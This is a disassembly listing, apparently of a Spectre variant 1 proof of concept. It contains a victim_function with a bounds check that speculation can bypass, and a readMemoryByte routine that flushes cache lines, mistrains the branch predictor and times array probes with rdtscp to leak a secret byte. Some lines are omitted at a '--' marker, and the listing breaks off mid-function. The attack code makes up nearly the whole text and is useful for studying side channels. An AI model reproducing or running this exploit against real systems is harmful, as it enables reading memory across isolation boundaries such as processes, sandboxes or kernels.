00000000000011a9 <victim_function>:
    11a9:	f3 0f 1e fa          	endbr64 
    11ad:	55                   	push   %rbp
    11ae:	48 89 e5             	mov    %rsp,%rbp
    11b1:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    11b5:	8b 05 65 2e 00 00    	mov    0x2e65(%rip),%eax        # 4020 <array1_size>
    11bb:	89 c0                	mov    %eax,%eax
    11bd:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
    11c1:	73 33                	jae    11f6 <victim_function+0x4d>
    11c3:	48 8d 15 76 2e 00 00 	lea    0x2e76(%rip),%rdx        # 4040 <array1>
    11ca:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    11ce:	48 01 d0             	add    %rdx,%rax
    11d1:	0f b6 00             	movzbl (%rax),%eax
    11d4:	0f b6 c0             	movzbl %al,%eax
    11d7:	c1 e0 09             	shl    $0x9,%eax
    11da:	48 98                	cltq   
    11dc:	48 8d 15 bd 2f 00 00 	lea    0x2fbd(%rip),%rdx        # 41a0 <array2>
    11e3:	0f b6 14 10          	movzbl (%rax,%rdx,1),%edx
    11e7:	0f b6 05 b2 2f 02 00 	movzbl 0x22fb2(%rip),%eax        # 241a0 <temp>
    11ee:	21 d0                	and    %edx,%eax
    11f0:	88 05 aa 2f 02 00    	mov    %al,0x22faa(%rip)        # 241a0 <temp>
    11f6:	90                   	nop
    11f7:	5d                   	pop    %rbp
    11f8:	c3                   	ret    

00000000000011f9 <readMemoryByte>:
    11f9:	f3 0f 1e fa          	endbr64 
    11fd:	55                   	push   %rbp
    11fe:	48 89 e5             	mov    %rsp,%rbp
    1201:	41 54                	push   %r12
    1203:	53                   	push   %rbx
    1204:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
    1208:	48 89 7d 88          	mov    %rdi,-0x78(%rbp)
    120c:	48 89 75 80          	mov    %rsi,-0x80(%rbp)
    1210:	48 89 95 78 ff ff ff 	mov    %rdx,-0x88(%rbp)
    1217:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    121e:	00 00 
    1220:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    1224:	31 c0                	xor    %eax,%eax
    1226:	c7 45 94 00 00 00 00 	movl   $0x0,-0x6c(%rbp)
    122d:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
    1234:	eb 1f                	jmp    1255 <readMemoryByte+0x5c>
    1236:	8b 45 a0             	mov    -0x60(%rbp),%eax
    1239:	48 98                	cltq   
    123b:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1242:	00 
    1243:	48 8d 05 76 2f 02 00 	lea    0x22f76(%rip),%rax        # 241c0 <results.0>
    124a:	c7 04 02 00 00 00 00 	movl   $0x0,(%rdx,%rax,1)
    1251:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
    1255:	81 7d a0 ff 00 00 00 	cmpl   $0xff,-0x60(%rbp)
    125c:	7e d8                	jle    1236 <readMemoryByte+0x3d>
    125e:	c7 45 9c e7 03 00 00 	movl   $0x3e7,-0x64(%rbp)
    1265:	e9 02 03 00 00       	jmp    156c <readMemoryByte+0x373>
    126a:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
    1271:	eb 22                	jmp    1295 <readMemoryByte+0x9c>
    1273:	8b 45 a0             	mov    -0x60(%rbp),%eax
    1276:	c1 e0 09             	shl    $0x9,%eax
    1279:	48 98                	cltq   
    127b:	48 8d 15 1e 2f 00 00 	lea    0x2f1e(%rip),%rdx        # 41a0 <array2>
    1282:	48 01 d0             	add    %rdx,%rax
    1285:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    1289:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    128d:	0f ae 38             	clflush (%rax)
    1290:	90                   	nop
    1291:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
    1295:	81 7d a0 ff 00 00 00 	cmpl   $0xff,-0x60(%rbp)
    129c:	7e d5                	jle    1273 <readMemoryByte+0x7a>
    129e:	8b 45 9c             	mov    -0x64(%rbp),%eax
    12a1:	8b 0d 79 2d 00 00    	mov    0x2d79(%rip),%ecx        # 4020 <array1_size>
    12a7:	ba 00 00 00 00       	mov    $0x0,%edx
    12ac:	f7 f1                	div    %ecx
    12ae:	89 d0                	mov    %edx,%eax
    12b0:	89 c0                	mov    %eax,%eax
    12b2:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    12b6:	c7 45 a4 1d 00 00 00 	movl   $0x1d,-0x5c(%rbp)
    12bd:	e9 90 00 00 00       	jmp    1352 <readMemoryByte+0x159>
    12c2:	48 8d 05 57 2d 00 00 	lea    0x2d57(%rip),%rax        # 4020 <array1_size>
    12c9:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    12cd:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    12d1:	0f ae 38             	clflush (%rax)
    12d4:	90                   	nop
    12d5:	c7 45 98 00 00 00 00 	movl   $0x0,-0x68(%rbp)
    12dc:	eb 09                	jmp    12e7 <readMemoryByte+0xee>
    12de:	8b 45 98             	mov    -0x68(%rbp),%eax
    12e1:	83 c0 01             	add    $0x1,%eax
    12e4:	89 45 98             	mov    %eax,-0x68(%rbp)
    12e7:	8b 45 98             	mov    -0x68(%rbp),%eax
    12ea:	83 f8 63             	cmp    $0x63,%eax
    12ed:	7e ef                	jle    12de <readMemoryByte+0xe5>
    12ef:	8b 4d a4             	mov    -0x5c(%rbp),%ecx
    12f2:	48 63 c1             	movslq %ecx,%rax
    12f5:	48 69 c0 ab aa aa 2a 	imul   $0x2aaaaaab,%rax,%rax
    12fc:	48 c1 e8 20          	shr    $0x20,%rax
    1300:	89 ce                	mov    %ecx,%esi
    1302:	c1 fe 1f             	sar    $0x1f,%esi
    1305:	89 c2                	mov    %eax,%edx
    1307:	29 f2                	sub    %esi,%edx
    1309:	89 d0                	mov    %edx,%eax
    130b:	01 c0                	add    %eax,%eax
    130d:	01 d0                	add    %edx,%eax
    130f:	01 c0                	add    %eax,%eax
    1311:	29 c1                	sub    %eax,%ecx
    1313:	89 ca                	mov    %ecx,%edx
    1315:	8d 42 ff             	lea    -0x1(%rdx),%eax
    1318:	66 b8 00 00          	mov    $0x0,%ax
    131c:	48 98                	cltq   
    131e:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    1322:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1326:	48 c1 e8 10          	shr    $0x10,%rax
--
    1349:	e8 5b fe ff ff       	call   11a9 <victim_function>
    134e:	83 6d a4 01          	subl   $0x1,-0x5c(%rbp)
    1352:	83 7d a4 00          	cmpl   $0x0,-0x5c(%rbp)
    1356:	0f 89 66 ff ff ff    	jns    12c2 <readMemoryByte+0xc9>
    135c:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
    1363:	e9 d6 00 00 00       	jmp    143e <readMemoryByte+0x245>
    1368:	8b 45 a0             	mov    -0x60(%rbp),%eax
    136b:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
    1371:	83 c0 0d             	add    $0xd,%eax
    1374:	25 ff 00 00 00       	and    $0xff,%eax
    1379:	89 45 ac             	mov    %eax,-0x54(%rbp)
    137c:	8b 45 ac             	mov    -0x54(%rbp),%eax
    137f:	c1 e0 09             	shl    $0x9,%eax
    1382:	48 98                	cltq   
    1384:	48 8d 15 15 2e 00 00 	lea    0x2e15(%rip),%rdx        # 41a0 <array2>
    138b:	48 01 d0             	add    %rdx,%rax
    138e:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    1392:	48 8d 45 94          	lea    -0x6c(%rbp),%rax
    1396:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    139a:	0f 01 f9             	rdtscp 
    139d:	89 ce                	mov    %ecx,%esi
    139f:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
    13a3:	89 31                	mov    %esi,(%rcx)
    13a5:	48 c1 e2 20          	shl    $0x20,%rdx
    13a9:	48 09 d0             	or     %rdx,%rax
    13ac:	49 89 c4             	mov    %rax,%r12
    13af:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    13b3:	0f b6 00             	movzbl (%rax),%eax
    13b6:	0f b6 c0             	movzbl %al,%eax
    13b9:	89 45 94             	mov    %eax,-0x6c(%rbp)
    13bc:	48 8d 45 94          	lea    -0x6c(%rbp),%rax
    13c0:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    13c4:	0f 01 f9             	rdtscp 
    13c7:	89 ce                	mov    %ecx,%esi
    13c9:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    13cd:	89 31                	mov    %esi,(%rcx)
    13cf:	48 c1 e2 20          	shl    $0x20,%rdx
    13d3:	48 09 d0             	or     %rdx,%rax
    13d6:	4c 29 e0             	sub    %r12,%rax
    13d9:	48 89 c3             	mov    %rax,%rbx
    13dc:	48 83 fb 50          	cmp    $0x50,%rbx
    13e0:	77 58                	ja     143a <readMemoryByte+0x241>
    13e2:	8b 45 9c             	mov    -0x64(%rbp),%eax
    13e5:	8b 0d 35 2c 00 00    	mov    0x2c35(%rip),%ecx        # 4020 <array1_size>
    13eb:	ba 00 00 00 00       	mov    $0x0,%edx
    13f0:	f7 f1                	div    %ecx
    13f2:	89 d0                	mov    %edx,%eax
    13f4:	89 c2                	mov    %eax,%edx
    13f6:	48 8d 05 43 2c 00 00 	lea    0x2c43(%rip),%rax        # 4040 <array1>
    13fd:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
    1401:	0f b6 c0             	movzbl %al,%eax
    1404:	39 45 ac             	cmp    %eax,-0x54(%rbp)
    1407:	74 31                	je     143a <readMemoryByte+0x241>
    1409:	8b 45 ac             	mov    -0x54(%rbp),%eax
    140c:	48 98                	cltq   
    140e:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1415:	00 
    1416:	48 8d 05 a3 2d 02 00 	lea    0x22da3(%rip),%rax        # 241c0 <results.0>
    141d:	8b 04 02             	mov    (%rdx,%rax,1),%eax
    1420:	8d 48 01             	lea    0x1(%rax),%ecx
    1423:	8b 45 ac             	mov    -0x54(%rbp),%eax
    1426:	48 98                	cltq   
    1428:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    142f:	00 
    1430:	48 8d 05 89 2d 02 00 	lea    0x22d89(%rip),%rax        # 241c0 <results.0>
    1437:	89 0c 02             	mov    %ecx,(%rdx,%rax,1)
    143a:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
    143e:	81 7d a0 ff 00 00 00 	cmpl   $0xff,-0x60(%rbp)
    1445:	0f 8e 1d ff ff ff    	jle    1368 <readMemoryByte+0x16f>
    144b:	c7 45 a8 ff ff ff ff 	movl   $0xffffffff,-0x58(%rbp)
    1452:	8b 45 a8             	mov    -0x58(%rbp),%eax
    1455:	89 45 a4             	mov    %eax,-0x5c(%rbp)
    1458:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
    145f:	e9 88 00 00 00       	jmp    14ec <readMemoryByte+0x2f3>
    1464:	83 7d a4 00          	cmpl   $0x0,-0x5c(%rbp)
    1468:	78 32                	js     149c <readMemoryByte+0x2a3>
    146a:	8b 45 a0             	mov    -0x60(%rbp),%eax
    146d:	48 98                	cltq   
    146f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1476:	00 
    1477:	48 8d 05 42 2d 02 00 	lea    0x22d42(%rip),%rax        # 241c0 <results.0>
    147e:	8b 14 02             	mov    (%rdx,%rax,1),%edx
    1481:	8b 45 a4             	mov    -0x5c(%rbp),%eax
    1484:	48 98                	cltq   
    1486:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
    148d:	00 
    148e:	48 8d 05 2b 2d 02 00 	lea    0x22d2b(%rip),%rax        # 241c0 <results.0>
    1495:	8b 04 01             	mov    (%rcx,%rax,1),%eax
    1498:	39 c2                	cmp    %eax,%edx
    149a:	7c 0e                	jl     14aa <readMemoryByte+0x2b1>
    149c:	8b 45 a4             	mov    -0x5c(%rbp),%eax
    149f:	89 45 a8             	mov    %eax,-0x58(%rbp)
    14a2:	8b 45 a0             	mov    -0x60(%rbp),%eax
    14a5:	89 45 a4             	mov    %eax,-0x5c(%rbp)
    14a8:	eb 3e                	jmp    14e8 <readMemoryByte+0x2ef>
    14aa:	83 7d a8 00          	cmpl   $0x0,-0x58(%rbp)
    14ae:	78 32                	js     14e2 <readMemoryByte+0x2e9>
    14b0:	8b 45 a0             	mov    -0x60(%rbp),%eax
    14b3:	48 98                	cltq   
    14b5:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    14bc:	00 
